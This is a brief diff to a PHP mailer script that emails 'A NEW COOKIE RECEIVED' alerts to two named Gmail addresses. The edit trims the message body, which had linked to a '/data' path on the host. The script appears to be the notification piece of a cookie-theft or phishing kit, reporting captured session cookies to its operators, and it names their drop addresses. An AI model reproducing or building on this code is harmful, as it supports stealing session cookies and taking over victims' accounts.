@@ -39,10 +39,7 @@ EOF;
   $mail->addAddress('kk442242@gmail.com', 'Receiver');
   $mail->addAddress('Danielscottatoarms@gmail.com', 'Receiver');
   $mail->Subject = 'A NEW COOKIE RECEIVED';
-  $mail->Body    = 'Please check the link below for more details
-
-
-'.$_SERVER['HTTP_HOST'].'/data';
+  $mail->Body    = 'Please check the link';
 
   if(!$mail->send()) {
       echo 'Message could not be sent.';
